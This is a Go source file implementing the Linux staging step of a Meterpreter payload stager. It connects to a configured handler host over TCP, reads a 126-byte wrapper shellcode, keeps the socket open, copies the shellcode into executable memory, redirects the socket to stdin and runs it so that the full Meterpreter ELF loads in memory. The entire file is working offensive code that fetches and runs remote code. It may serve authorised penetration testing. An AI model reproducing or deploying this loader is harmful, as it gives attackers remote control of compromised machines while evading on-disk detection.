//go:build linux

// Linux-specific implementation of Meterpreter staging.
//
// Linux Meterpreter uses a different staging protocol than Windows:
//  1. Handler sends 126-byte wrapper shellcode (no size prefix)
//  2. Wrapper shellcode reads the full ELF payload from the socket
//  3. Wrapper loads and executes the ELF in memory
//
// The wrapper expects the socket on stdin (fd 0) to read the remaining payload.
package meterpreter

import (
	"fmt"
	"io"
	"net"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// keepAliveFiles prevents garbage collection of socket file descriptors.
// If these files are GC'd, the underlying socket fd will be closed,
// breaking the Meterpreter connection.
var keepAliveFiles []*os.File

// platformSpecificStage handles Linux staging.
func (s *Stager) platformSpecificStage() error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("this code should only run on Linux")
	}
	return s.stageLinux()
}

func (s *Stager) stageLinux() error {
	shellcode, sockfd, err := s.fetchStageLinux()
	if err != nil {
		return fmt.Errorf("failed to fetch stage: %w", err)
	}

	if len(shellcode) > 500*1024 {
		return fmt.Errorf("received payload too large (%d bytes), probably stageless instead of staged. "+
			"Use handler with staged payload (e.g., linux/x64/meterpreter/reverse_tcp, NOT meterpreter_reverse_tcp)", len(shellcode))
	}

	if len(shellcode) < 50 {
		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
	}

	return executeInMemoryWithSocket(shellcode, sockfd)
}

// fetchStageLinux retrieves the stage and returns the socket fd.
func (s *Stager) fetchStageLinux() ([]byte, int, error) {
	switch s.config.Transport {
	case TransportTCP:
		return s.fetchStageTCPLinux()
	default:
		return nil, -1, fmt.Errorf("transport %s not yet implemented for Linux (use tcp)", s.config.Transport)
	}
}

// fetchStageTCPLinux retrieves the 126-byte wrapper via TCP and returns
// the wrapper shellcode along with the socket fd for Meterpreter.
func (s *Stager) fetchStageTCPLinux() ([]byte, int, error) {
	address := net.JoinHostPort(s.config.Host, s.config.Port)

	dialer := &net.Dialer{
		Timeout: s.config.Timeout,
	}

	conn, err := dialer.Dial("tcp", address)
	if err != nil {
		return nil, -1, fmt.Errorf("TCP dial failed: %w", err)
	}

	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		conn.Close()
		return nil, -1, fmt.Errorf("not a TCP connection")
	}

	// Read ONLY the 126-byte wrapper shellcode. The wrapper will read
	// the remaining ELF payload from the socket itself.
	tcpConn.SetReadDeadline(time.Now().Add(10 * time.Second))

	stage := make([]byte, 126)
	_, err = io.ReadFull(conn, stage)
	if err != nil {
		conn.Close()
		return nil, -1, fmt.Errorf("failed to read wrapper: %w", err)
	}

	// Remove timeout so Meterpreter can use the socket indefinitely.
	tcpConn.SetReadDeadline(time.Time{})

	// Detach the socket fd from Go's runtime management.
	file, err := tcpConn.File()
	if err != nil {
		conn.Close()
		return nil, -1, fmt.Errorf("failed to get file descriptor: %w", err)
	}

	conn.Close()

	sockfd := int(file.Fd())

	// Store file globally to prevent garbage collection.
	keepAliveFiles = append(keepAliveFiles, file)

	return stage, sockfd, nil
}

// executeInMemoryWithSocket allocates RWX memory via mmap, copies the wrapper
// shellcode, duplicates the socket to stdin, and executes the wrapper.
func executeInMemoryWithSocket(stage []byte, sockfd int) error {
	page := syscall.Getpagesize()
	size := (len(stage) + page - 1) / page * page

	mem, err := syscall.Mmap(-1, 0, size,
		syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,
		syscall.MAP_PRIVATE|syscall.MAP_ANON)
	if err != nil {
		return fmt.Errorf("mmap: %v", err)
	}

	copy(mem, stage)

	// Duplicate socket to stdin (fd 0) so the wrapper can read from it.
	if _, _, errno := syscall.Syscall(syscall.SYS_DUP2, uintptr(sockfd), 0, 0); errno != 0 {
		return fmt.Errorf("dup2: %v", errno)
	}

	shellcodeAddr := uintptr(unsafe.Pointer(&mem[0]))

	// Execute in a locked OS thread.
	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		funcPtr := *(*func())(unsafe.Pointer(&shellcodeAddr))
		funcPtr()
	}()

	runtime.Gosched()
	runtime.Gosched()

	// Block forever -- parent must stay alive for Meterpreter.
	select {}
}
